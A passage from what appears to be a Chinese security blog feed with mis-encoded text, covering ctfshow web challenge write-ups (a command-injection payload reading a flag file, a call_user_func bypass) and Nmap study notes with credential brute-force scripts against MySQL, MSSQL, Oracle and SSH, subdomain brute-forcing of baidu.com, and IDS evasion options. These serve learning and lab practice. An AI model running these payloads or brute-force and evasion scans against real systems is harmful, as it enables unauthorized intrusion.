keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ê≠£Â∏∏payloadÔºö<br>?c&#x3D;cat &#x2F;f149_15_h3r3;<br>‰∫ÜËß£Âà∞‰∏Ä‰∏™Êñ∞ÂëΩ‰ª§<strong>tee</strong></p><p><img src="https://img-blog.csdnimg.cn/ef21c0b92cfa4020a35d2eecd96c810a.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/155bbf7015c644e78f91879a196f54ff.png" alt="2"></p><p><strong>Âè¶‰∏Ä‰∏™ÊñπÊ≥ï</strong><br><a href="https://www.runoob.com/linux/linux-comm-sed.html">sedÂëΩ‰ª§</a><br><img src="https://img-blog.csdnimg.cn/bcf4813af45545da88e99629f676795d.png" alt="3"><br><a href="https://www.runoob.com/linux/linux-comm-xargs.html">xargsÂëΩ‰ª§</a></p><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøáÊª§‰∫Ü::Ôºå‰∏çËÉΩÁî®‰∏äÈ¢òÁöÑ<code>ctfshow=stfshow::getFlag</code>‰∫Ü„ÄÇ<br>call_user_funcÂáΩÊï∞Âú®phpÊñáÊ°£‰∏≠ËøòÊúâÊÄùË∑Ø<br><img src="https://img-blog.csdnimg.cn/b1a697d445cb4291a8ff69bf33f07212.png" alt="1"><br>‰πüÂ∞±ÊòØËØ¥call_user_funcÂáΩÊï∞ÂèØ‰ª•‰º†ÂÖ•Êï∞ÁªÑÂâçÈù¢ÊòØÁ±ªÂêçÔºåÂêéÈù¢ÊòØÊñπÊ≥ïÂêç„ÄÇ<br>payload<code>POST ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code><br><img src="https://img-blog.csdnimg.cn/85b359077b3f45c888d616edab8888af.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NmapÂ≠¶‰π†Á¨îËÆ∞</title>
      <link href="/2023/03/23/Nmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/23/Nmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="Âü∫Êú¨Êìç‰Ωú"><a href="#Âü∫Êú¨Êìç‰Ωú" class="headerlink" title="Âü∫Êú¨Êìç‰Ωú"></a>Âü∫Êú¨Êìç‰Ωú</h2><blockquote><p>nmap 0.0.0.0ÔºàÊú¨Êú∫IPÔºâ</p></blockquote><p>nmapÈªòËÆ§ÂèëÈÄÅ‰∏Ä‰∏™arpÁöÑpingÂåÖÔºåÊé¢ÊµãÁõÆÊ†á‰∏ªÊú∫0-1000ÁöÑÁ´ØÂè£„ÄÇ<a href="https://blog.csdn.net/qq_47125775/article/details/108433224">arpÔºàÂú∞ÂùÄËß£ÊûêÂçèËÆÆÔºâ</a></p><blockquote><p>nmap ip ip<br> nmap 0.0.0.0 1.1.1.1</p></blockquote><p>Âø´ÈÄüÊâ´ÊèèÂ§ö‰∏™IP</p><blockquote><p>nmap -p (ËåÉÂõ¥) IP<br> nmap -p 80,20-200 1.1.1.1</p></blockquote><p>ÊåáÂÆöÁ´ØÂè£ÂíåËåÉÂõ¥ËøõË°åÊâ´Êèè</p><blockquote><p>nmap 192.168.227.1&#x2F;24 -exclude 192.168.227.1</p></blockquote><p>Êâ´ÊèèÈô§ËøáÊüê‰∏Ä‰∏™ipÂ§ñÁöÑÊâÄÊúâÂ≠êÁΩë‰∏ªÊú∫</p><blockquote><p>nmap -sL 192.168.227.1&#x2F;24</p></blockquote><p>ÊòæÁ§∫Êâ´ÊèèÁöÑÊâÄÊúâ‰∏ªÊú∫ÁöÑÂàóË°®</p><blockquote><p>namp -sp 1.1.1.1-255</p></blockquote><p>Êâ´ÊèèÂÜÖÁΩëÁöÑ‰∏Ä‰∏™IPËåÉÂõ¥(pingÊâ´Êèè)</p><blockquote><p>nmap -sS 1.1.1.1<br> Tcp SYN Scan (sS) ËøôÊòØ‰∏Ä‰∏™Âü∫Êú¨ÁöÑÊâ´ÊèèÊñπÂºè,ÂÆÉË¢´Áß∞‰∏∫ÂçäÂºÄÊîæÊâ´ÊèèÔºåÂõ†‰∏∫ËøôÁßçÊäÄÊúØ‰ΩøÂæóNmap‰∏çÈúÄË¶ÅÈÄöËøáÂÆåÊï¥ÁöÑÊè°ÊâãÔºåÂ∞±ËÉΩËé∑ÂæóËøúÁ®ã‰∏ªÊú∫ÁöÑ‰ø°ÊÅØ„ÄÇNmapÂèëÈÄÅSYNÂåÖÂà∞ËøúÁ®ã‰∏ªÊú∫Ôºå‰ΩÜÊòØÂÆÉ‰∏ç‰ºö‰∫ßÁîü‰ªª‰Ωï‰ºöËØù.Âõ†Ê≠§‰∏ç‰ºö<strong>Âú®ÁõÆÊ†á‰∏ªÊú∫‰∏ä‰∫ßÁîü‰ªª‰ΩïÊó•ÂøóËÆ∞ÂΩï</strong>,Âõ†‰∏∫Ê≤°ÊúâÂΩ¢Êàê‰ºöËØù„ÄÇËøô‰∏™Â∞±ÊòØSYNÊâ´ÊèèÁöÑ‰ºòÂäø.Â¶ÇÊûúNmapÂëΩ‰ª§‰∏≠Ê≤°ÊúâÊåáÂá∫Êâ´ÊèèÁ±ªÂûã,ÈªòËÆ§ÁöÑÂ∞±ÊòØTcp SYN.‰ΩÜÊòØÂÆÉÈúÄË¶Åroot&#x2F;administratorÊùÉÈôê„ÄÇ</p></blockquote><p>SYNÂçäÂºÄÊîæÊâ´Êèè</p><blockquote><p>namp -sT 192.168.227.154<br> ‰∏çÂêå‰∫éTcp SYNÊâ´Êèè,Tcp connect()Êâ´ÊèèÈúÄË¶ÅÂÆåÊàê‰∏âÊ¨°Êè°Êâã,Âπ∂‰∏îË¶ÅÊ±ÇË∞ÉÁî®Á≥ªÁªüÁöÑconnect().Tcp connect()Êâ´ÊèèÊäÄÊúØ<strong>Âè™ÈÄÇÁî®‰∫éÊâæÂá∫TCPÂíåUDPÁ´ØÂè£„ÄÇ</strong></p></blockquote><p>TCPÊâ´Êèè</p><blockquote><p>nmap -sU 192.168.206.124<br> ËøôÁßçÊâ´ÊèèÊäÄÊúØ<strong>Áî®Êù•ÂØªÊâæÁõÆÊ†á‰∏ªÊú∫ÊâìÂºÄÁöÑUDPÁ´ØÂè£</strong>.ÂÆÉ‰∏çÈúÄË¶ÅÂèëÈÄÅ‰ªª‰ΩïÁöÑSYNÂåÖÔºåÂõ†‰∏∫ËøôÁßçÊäÄÊúØÊòØÈíàÂØπUDPÁ´ØÂè£ÁöÑ„ÄÇUDPÊâ´ÊèèÂèëÈÄÅUDPÊï∞ÊçÆÂåÖÂà∞ÁõÆÊ†á‰∏ªÊú∫ÔºåÂπ∂Á≠âÂæÖÂìçÂ∫î,Â¶ÇÊûúËøîÂõûICMP‰∏çÂèØËææÁöÑÈîôËØØÊ∂àÊÅØÔºåËØ¥ÊòéÁ´ØÂè£ÊòØÂÖ≥Èó≠ÁöÑÔºåÂ¶ÇÊûúÂæóÂà∞Ê≠£Á°ÆÁöÑÈÄÇÂΩìÁöÑÂõûÂ∫îÔºåËØ¥ÊòéÁ´ØÂè£ÊòØÂºÄÊîæÁöÑ.</p></blockquote><p>UDPÊâ´Êèè</p><blockquote><p>nmap -sV 192.168.206.135<br> ÁâàÊú¨Ê£ÄÊµãÊòØ<strong>Áî®Êù•Êâ´ÊèèÁõÆÊ†á‰∏ªÊú∫ÂíåÁ´ØÂè£‰∏äËøêË°åÁöÑËΩØ‰ª∂ÁöÑÁâàÊú¨.ÂÆÉ‰∏çÂêå‰∫éÂÖ∂ÂÆÉÁöÑÊâ´ÊèèÊäÄÊúØÔºåÂÆÉ‰∏çÊòØÁî®Êù•Êâ´ÊèèÁõÆÊ†á‰∏ªÊú∫‰∏äÂºÄÊîæÁöÑÁ´ØÂè£Ôºå‰∏çËøáÂÆÉÈúÄË¶Å‰ªéÂºÄÊîæÁöÑÁ´ØÂè£Ëé∑Âèñ‰ø°ÊÅØÊù•Âà§Êñ≠ËΩØ‰ª∂ÁöÑÁâàÊú¨.‰ΩøÁî®ÁâàÊú¨Ê£ÄÊµãÊâ´Êèè‰πãÂâçÈúÄË¶ÅÂÖàÁî®TCPSYNÊâ´ÊèèÂºÄÊîæ‰∫ÜÂì™‰∫õÁ´ØÂè£„ÄÇËøô‰∏™Êâ´ÊèèÁöÑËØùÔºåÈÄüÂ∫¶‰ºöÊÖ¢‰∏Ä‰∫õÔºå67.86ÁßíÊâ´‰∏Ä‰∏™IP</strong>„ÄÇ</p></blockquote><p>VersionÁâàÊú¨Êâ´Êèè</p><blockquote><p>nmap -O 192.168.126.206</p></blockquote><p>OSÊìç‰ΩúÁ≥ªÁªüÁ±ªÂûãÊ£ÄÊµã</p><blockquote><p>nmap -O -PN 192.168.206.124<br> Â¶ÇÊûúËøúÁ®ã‰∏ªÊú∫ÊúâÈò≤ÁÅ´Â¢ôÔºåIDSÂíåIPSÁ≥ªÁªüÔºå‰Ω†ÂèØ‰ª•‰ΩøÁî®-PNÂëΩ‰ª§Êù•Á°Æ‰øù‰∏çpingËøúÁ®ã‰∏ªÊú∫ÔºåÂõ†‰∏∫ÊúâÊó∂ÂÄôÈò≤ÁÅ´Â¢ô‰ºöÁªÑÁªáÊéâpingËØ∑Ê±Ç.-PNÂëΩ‰ª§ÂëäËØâNmap‰∏çÁî®pingËøúÁ®ã‰∏ªÊú∫„ÄÇ‰ΩøÁî®-PNÂèÇÊï∞ÂèØ‰ª•ÁªïËøáPINGÂëΩ‰ª§,‰ΩÜÊòØ‰∏çÂΩ±Âìç‰∏ªÊú∫ÁöÑÁ≥ªÁªüÁöÑÂèëÁé∞„ÄÇ<br> Ëøô‰∏™Êâ´ÊèèÊï¥‰∏™cÊÆµÂ±ÄÂüüÁΩëÁöÑËØùËøòÊòØÊØîËæÉËÄóÊó∂ÁöÑÔºå‰ΩÜÊòØ‰ø°ÊÅØÊî∂ÈõÜÂæàËØ¶ÁªÜÔºåÂ§ßÊ¶ÇËÄóÊó∂9ÂàÜÈíü„ÄÇ</p></blockquote><p>NO ping Êâ´Êèè</p><blockquote><p>10.1.1.0&#x2F;24 &#x3D; 10.1.1.1-10.1.1.255 #cÊÆµÊâ´Êèè<br> 10.1.1.0&#x2F;16 &#x3D; 10.1.1.1-10.1.255.255 #bÊÆµÊâ´Êèè<br> 10.1.1.0&#x2F;8 &#x3D; 10.1.1.1-10.255.255.255 #aÊÆµÊâ´Êèè</p></blockquote><p><strong>ÁΩëÊÆµÊâ´ÊèèÊ†ºÂºè</strong></p><blockquote><p>nmap -iL ip-address.txt</p></blockquote><p>‰ªéÊñá‰ª∂‰∏≠ËØªÂèñÈúÄË¶ÅÊâ´ÊèèÁöÑÂàóË°®</p><h2 id="nmapÈ´òÁ∫ßÁî®Ê≥ï‰πãËÑöÊú¨‰ΩøÁî®"><a href="#nmapÈ´òÁ∫ßÁî®Ê≥ï‰πãËÑöÊú¨‰ΩøÁî®" class="headerlink" title="nmapÈ´òÁ∫ßÁî®Ê≥ï‰πãËÑöÊú¨‰ΩøÁî®"></a>nmapÈ´òÁ∫ßÁî®Ê≥ï‰πãËÑöÊú¨‰ΩøÁî®</h2><p>MYSQLÊö¥ÂäõÁ†¥Ëß£</p><blockquote><p>nmap ‚Äìscript&#x3D;mysql-brute <target></p></blockquote><blockquote><p>3306&#x2F;tcp open  mysql<br> | mysql-brute:<br> |   Accounts<br> |     root:root - Valid credentials</p></blockquote><p>MsSQLËøõË°åÊö¥ÂäõÁ†¥Ëß£</p><blockquote><p>nmap -p 1433 ‚Äìscript ms-sql-brute ‚Äìscript-args userdb&#x3D;customuser.txt,passdb&#x3D;custompass.txt <host></p></blockquote><blockquote><p>| ms-sql-brute:<br> |   [192.168.100.128\TEST]<br> |     No credentials found<br> |     Warnings:<br> |       sa: AccountLockedOut<br> |   [192.168.100.128\PROD]<br> |     Credentials found:<br> |       webshop_reader:secret &#x3D;&gt; Login Success<br> |       testuser:secret1234 &#x3D;&gt; PasswordMustChange<br> |_      lordvader:secret1234 &#x3D;&gt; Login Success</p></blockquote><p>ÂØπOracleÊï∞ÊçÆÂ∫ìËøõË°åÊö¥Á†¥Ëß£</p><blockquote><p>nmap ‚Äìscript oracle-brute -p 1521 ‚Äìscript-args oracle-brute.sid&#x3D;ORCL <host></p></blockquote><blockquote><p>PORT     STATE  SERVICE REASON<br> 1521&#x2F;tcp open  oracle  syn-ack<br> | oracle-brute:<br> |   Accounts<br> |     system:powell &#x3D;&gt; Account locked<br> |     haxxor:haxxor &#x3D;&gt; Valid credentials<br> |   Statistics<br> |_    Perfomed 157 guesses in 8 seconds, average tps: 19</p></blockquote><p>ÂØπSSHËøõË°åÊö¥ÂäõÁ†¥Ëß£</p><blockquote><p>nmap -p 22 ‚Äìscript ssh-brute ‚Äìscript-args userdb&#x3D;users.lst,passdb&#x3D;pass.lst ‚Äìscript-args ssh-brute.timeout&#x3D;4s <target></p></blockquote><blockquote><p>22&#x2F;ssh open  ssh<br> | ssh-brute:<br> |  Accounts<br> |    username:password<br> |  Statistics<br> |_   Performed 32 guesses in 25 seconds.</p></blockquote><p>Âà©Áî®DNSËøõË°åÂ≠êÂüüÂêçÊö¥ÂäõÁ†¥Ëß£</p><blockquote><p>nmap ‚Äìscript dns-brute <a href="http://www.baidu.com/">www.baidu.com</a></p></blockquote><blockquote><p>Œª nmap ‚Äìscript dns-brute <a href="http://www.baidu.com/">www.baidu.com</a><br> Starting Nmap 7.50 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2017-07-25 13:12 ?<br> Nmap scan report for <a href="http://www.baidu.com/">www.baidu.com</a> (180.97.33.108)<br> Host is up (0.018s latency).<br> Other addresses for <a href="http://www.baidu.com/">www.baidu.com</a> (not scanned): 180.97.33.10<br> Not shown: 998 filtered ports<br> PORT    STATE SERVICE<br> 80&#x2F;tcp  open  http<br> 443&#x2F;tcp open  https<br> Host script results:<br> | dns-brute:<br> |   DNS Brute-force hostnames:<br> |     admin.baidu.com - 10.26.109.19<br> |     mx.baidu.com - 61.135.163.61<br> |     svn.baidu.com - 10.65.211.174<br> |     ads.baidu.com - 10.42.4.225<br> Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds</p></blockquote><h2 id="ÂèÇÊï∞ËØ¶Ëß£"><a href="#ÂèÇÊï∞ËØ¶Ëß£" class="headerlink" title="ÂèÇÊï∞ËØ¶Ëß£"></a>ÂèÇÊï∞ËØ¶Ëß£</h2><p>NmapÊîØÊåÅ‰∏ªÊú∫Âêç,ip,ÁΩëÊÆµÁöÑË°®Á§∫ÊñπÂºè<br> ‰æãÂ¶Ç:blah.highon.coffee, namp.org&#x2F;24, 192.168.0.1;10.0.0-25.1-254</p><blockquote><p>-iL filename                    ‰ªéÊñá‰ª∂‰∏≠ËØªÂèñÂæÖÊ£ÄÊµãÁöÑÁõÆÊ†á,Êñá‰ª∂‰∏≠ÁöÑË°®Á§∫ÊñπÊ≥ïÊîØÊåÅÊú∫Âêç,ip,ÁΩëÊÆµ<br> -iR hostnum                     ÈöèÊú∫ÈÄâÂèñ,ËøõË°åÊâ´Êèè.Â¶ÇÊûú-iRÊåáÂÆö‰∏∫0,ÂàôÊòØÊó†‰ºëÊ≠¢ÁöÑÊâ´Êèè<br> ‚Äìexclude host1[, host2]        ‰ªéÊâ´Êèè‰ªªÂä°‰∏≠ÈúÄË¶ÅÊéíÈô§ÁöÑ‰∏ªÊú∫<br> ‚Äìexculdefile exclude_file      ÊéíÈô§Êñá‰ª∂‰∏≠ÁöÑIP,Ê†ºÂºèÂíå-iLÊåáÂÆöÊâ´ÊèèÊñá‰ª∂ÁöÑÊ†ºÂºèÁõ∏Âêå</p></blockquote><p>‰∏ªÊú∫ÂèëÁé∞</p><blockquote><p>-sL                     ‰ªÖ‰ªÖÊòØÊòæÁ§∫,Êâ´ÊèèÁöÑIPÊï∞ÁõÆ,‰∏ç‰ºöËøõË°å‰ªª‰ΩïÊâ´Êèè<br> -sn                     pingÊâ´Êèè,Âç≥‰∏ªÊú∫ÂèëÁé∞<br> -Pn                     ‰∏çÊ£ÄÊµã‰∏ªÊú∫Â≠òÊ¥ª<br> -PS&#x2F;PA&#x2F;PU&#x2F;PY[portlist]  TCP SYN Ping&#x2F;TCP ACK Ping&#x2F;UDP PingÂèëÁé∞<br> -PE&#x2F;PP&#x2F;PM               ‰ΩøÁî®ICMP echo, timestamp and netmask ËØ∑Ê±ÇÂåÖÂèëÁé∞‰∏ªÊú∫<br> -PO[prococol list]      ‰ΩøÁî®IPÂçèËÆÆÂåÖÊé¢ÊµãÂØπÊñπ‰∏ªÊú∫ÊòØÂê¶ÂºÄÂêØ<br> -n&#x2F;-R                   ‰∏çÂØπIPËøõË°åÂüüÂêçÂèçÂêëËß£Êûê&#x2F;‰∏∫ÊâÄÊúâÁöÑIPÈÉΩËøõË°åÂüüÂêçÁöÑÂèçÂìçËß£Êûê</p></blockquote><p>Êâ´ÊèèÊäÄÂ∑ß</p><blockquote><p>-sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM                 TCP SYN&#x2F;TCP connect()&#x2F;ACK&#x2F;TCPÁ™óÂè£Êâ´Êèè&#x2F;TCP MaimonÊâ´Êèè<br> -sU                             UDPÊâ´Êèè<br> -sN&#x2F;sF&#x2F;sX                       TCP NullÔºåFINÔºåand XmasÊâ´Êèè<br> ‚Äìscanflags                     Ëá™ÂÆö‰πâTCPÂåÖ‰∏≠ÁöÑflags<br> -sI zombie host[:probeport]     Idlescan<br> -sY&#x2F;sZ                          SCTP INIT&#x2F;COOKIE-ECHO Êâ´Êèè<br> -sO                             ‰ΩøÁî®IP protocol Êâ´ÊèèÁ°ÆÂÆöÁõÆÊ†áÊú∫ÊîØÊåÅÁöÑÂçèËÆÆÁ±ªÂûã<br> -b ‚ÄúFTP relay host‚Äù             ‰ΩøÁî®FTP bounce scan</p></blockquote><p>ÊåáÂÆöÁ´ØÂè£ÂíåÊâ´ÊèèÈ°∫Â∫è</p><blockquote><p>-p                      ÁâπÂÆöÁöÑÁ´ØÂè£ -p80,443 ÊàñËÄÖ -p1-65535<br> -p U:PORT               Êâ´ÊèèudpÁöÑÊüê‰∏™Á´ØÂè£, -p U:53<br> -F                      Âø´ÈÄüÊâ´ÊèèÊ®°Âºè,ÊØîÈªòËÆ§ÁöÑÊâ´ÊèèÁ´ØÂè£ËøòÂ∞ë<br> -r                      ‰∏çÈöèÊú∫Êâ´ÊèèÁ´ØÂè£,ÈªòËÆ§ÊòØÈöèÊú∫Êâ´ÊèèÁöÑ<br> ‚Äìtop-ports ‚Äúnumber‚Äù    Êâ´ÊèèÂºÄÊîæÊ¶ÇÁéáÊúÄÈ´òÁöÑnumber‰∏™Á´ØÂè£,Âá∫Áé∞ÁöÑÊ¶ÇÁéáÈúÄË¶ÅÂèÇËÄÉnmap-servicesÊñá‰ª∂,ubuntu‰∏≠ËØ•Êñá‰ª∂‰Ωç‰∫é&#x2F;usr&#x2F;share&#x2F;nmap.nmapÈªòËÆ§Êâ´Ââç1000‰∏™<br> ‚Äìport-ratio ‚Äúratio‚Äù    Êâ´ÊèèÊåáÂÆöÈ¢ëÁéá‰ª•‰∏äÁöÑÁ´ØÂè£</p></blockquote><p>ÊúçÂä°ÁâàÊú¨ËØÜÂà´</p><blockquote><p>-sV                             ÂºÄÊîæÁâàÊú¨Êé¢Êµã,ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®-AÂêåÊó∂ÊâìÂºÄÊìç‰ΩúÁ≥ªÁªüÊé¢ÊµãÂíåÁâàÊú¨Êé¢Êµã<br> ‚Äìversion-intensity ‚Äúlevel‚Äù     ËÆæÁΩÆÁâàÊú¨Êâ´ÊèèÂº∫Â∫¶,Âº∫Â∫¶Ê∞¥Âπ≥ËØ¥Êòé‰∫ÜÂ∫îËØ•‰ΩøÁî®Âì™‰∫õÊé¢ÊµãÊä•Êñá„ÄÇÊï∞ÂÄºË∂äÈ´òÔºåÊúçÂä°Ë∂äÊúâÂèØËÉΩË¢´Ê≠£Á°ÆËØÜÂà´„ÄÇÈªòËÆ§ÊòØ7<br> ‚Äìversion-light                 ÊâìÂºÄËΩªÈáèÁ∫ßÊ®°Âºè,‰∏∫‚Äìversion-intensity 2ÁöÑÂà´Âêç<br> ‚Äìversion-all                   Â∞ùËØïÊâÄÊúâÊé¢Êµã,‰∏∫‚Äìversion-intensity 9ÁöÑÂà´Âêç<br> ‚Äìversion-trace                 ÊòæÁ§∫Âá∫ËØ¶ÁªÜÁöÑÁâàÊú¨‰æ¶ÊµãËøáÁ®ã‰ø°ÊÅØ</p></blockquote><p>ËÑöÊú¨Êâ´Êèè</p><blockquote><p>-sC                             Ê†πÊçÆÁ´ØÂè£ËØÜÂà´ÁöÑÊúçÂä°,Ë∞ÉÁî®ÈªòËÆ§ËÑöÊú¨<br> ‚Äìscript&#x3D;‚ÄùLua scripts‚Äù          Ë∞ÉÁî®ÁöÑËÑöÊú¨Âêç<br> ‚Äìscript-args&#x3D;n1&#x3D;v1,[n2&#x3D;v2]     Ë∞ÉÁî®ÁöÑËÑöÊú¨‰º†ÈÄíÁöÑÂèÇÊï∞<br> ‚Äìscript-args-file&#x3D;filename     ‰ΩøÁî®ÊñáÊú¨‰º†ÈÄíÂèÇÊï∞<br> ‚Äìscript-trace                  ÊòæÁ§∫ÊâÄÊúâÂèëÈÄÅÂíåÊé•Êî∂Âà∞ÁöÑÊï∞ÊçÆ<br> ‚Äìscript-updatedb               Êõ¥Êñ∞ËÑöÊú¨ÁöÑÊï∞ÊçÆÂ∫ì<br> ‚Äìscript-help&#x3D;‚ÄùLua script‚Äù      ÊòæÁ§∫ÊåáÂÆöËÑöÊú¨ÁöÑÂ∏ÆÂä©</p></blockquote><p>OSËØÜÂà´</p><blockquote><p>-O              ÂêØÁî®Êìç‰ΩúÁ≥ªÁªüÊ£ÄÊµã,-AÊù•ÂêåÊó∂ÂêØÁî®Êìç‰ΩúÁ≥ªÁªüÊ£ÄÊµãÂíåÁâàÊú¨Ê£ÄÊµã<br> ‚Äìosscan-limit  ÈíàÂØπÊåáÂÆöÁöÑÁõÆÊ†áËøõË°åÊìç‰ΩúÁ≥ªÁªüÊ£ÄÊµã(Ëá≥Â∞ëÈúÄÁ°ÆÁü•ËØ•‰∏ªÊú∫ÂàÜÂà´Êúâ‰∏Ä‰∏™openÂíåclosedÁöÑÁ´ØÂè£)<br> ‚Äìosscan-guess  Êé®ÊµãÊìç‰ΩúÁ≥ªÁªüÊ£ÄÊµãÁªìÊûú,ÂΩìNmapÊó†Ê≥ïÁ°ÆÂÆöÊâÄÊ£ÄÊµãÁöÑÊìç‰ΩúÁ≥ªÁªüÊó∂Ôºå‰ºöÂ∞ΩÂèØËÉΩÂú∞Êèê‰æõÊúÄÁõ∏ËøëÁöÑÂåπÈÖçÔºåNmapÈªòËÆ§ËøõË°åËøôÁßçÂåπÈÖç<br> Èò≤ÁÅ´Â¢ô&#x2F;IDSË∫≤ÈÅøÂíåÂìÑÈ™ó<br> -f; ‚Äìmtu value                 ÊåáÂÆö‰ΩøÁî®ÂàÜÁâá„ÄÅÊåáÂÆöÊï∞ÊçÆÂåÖÁöÑMTU.<br> -D decoy1,decoy2,ME             ‰ΩøÁî®ËØ±È•µÈöêËîΩÊâ´Êèè<br> -S IP-ADDRESS                   Ê∫êÂú∞ÂùÄÊ¨∫È™ó<br> -e interface                    ‰ΩøÁî®ÊåáÂÆöÁöÑÊé•Âè£<br> -g&#x2F; ‚Äìsource-port PROTNUM       ‰ΩøÁî®ÊåáÂÆöÊ∫êÁ´ØÂè£<br> ‚Äìproxies url1,[url2],‚Ä¶       ‰ΩøÁî®HTTPÊàñËÄÖSOCKS4ÁöÑ‰ª£ÁêÜ</p></blockquote><blockquote><p>‚Äìdata-length NUM               Â°´ÂÖÖÈöèÊú∫Êï∞ÊçÆËÆ©Êï∞ÊçÆÂåÖÈïøÂ∫¶ËææÂà∞NUM<br> ‚Äìip-options OPTIONS            ‰ΩøÁî®ÊåáÂÆöÁöÑIPÈÄâÈ°πÊù•ÂèëÈÄÅÊï∞ÊçÆÂåÖ<br> ‚Äìttl VALUE                     ËÆæÁΩÆIP time-to-liveÂüü<br> ‚Äìspoof-mac ADDR&#x2F;PREFIX&#x2F;VEBDOR  MACÂú∞ÂùÄ‰º™Ë£Ö<br> ‚Äìbadsum                        ‰ΩøÁî®ÈîôËØØÁöÑchecksumÊù•ÂèëÈÄÅÊï∞ÊçÆÂåÖ<br> Nmap ËæìÂá∫<br> -oN                     Â∞ÜÊ†áÂáÜËæìÂá∫Áõ¥Êé•ÂÜôÂÖ•ÊåáÂÆöÁöÑÊñá‰ª∂<br> -oX                     ËæìÂá∫xmlÊñá‰ª∂<br> -oS                     Â∞ÜÊâÄÊúâÁöÑËæìÂá∫ÈÉΩÊîπ‰∏∫Â§ßÂÜô<br> -oG                     ËæìÂá∫‰æø‰∫éÈÄöËøábashÊàñËÄÖperlÂ§ÑÁêÜÁöÑÊ†ºÂºè,Èùûxml<br> -oA BASENAME            ÂèØÂ∞ÜÊâ´ÊèèÁªìÊûú‰ª•Ê†áÂáÜÊ†ºÂºè„ÄÅXMLÊ†ºÂºèÂíåGrepÊ†ºÂºè‰∏ÄÊ¨°ÊÄßËæìÂá∫<br> -v                      ÊèêÈ´òËæìÂá∫‰ø°ÊÅØÁöÑËØ¶ÁªÜÂ∫¶<br> -d level                ËÆæÁΩÆdebugÁ∫ßÂà´,ÊúÄÈ´òÊòØ9<br> ‚Äìreason                ÊòæÁ§∫Á´ØÂè£Â§Ñ‰∫éÂ∏¶Á°ÆËÆ§Áä∂ÊÄÅÁöÑÂéüÂõ†<br> ‚Äìopen                  Âè™ËæìÂá∫Á´ØÂè£Áä∂ÊÄÅ‰∏∫openÁöÑÁ´ØÂè£<br> ‚Äìpacket-trace          ÊòæÁ§∫ÊâÄÊúâÂèëÈÄÅÊàñËÄÖÊé•Êî∂Âà∞ÁöÑÊï∞ÊçÆÂåÖ<br> ‚Äìiflist                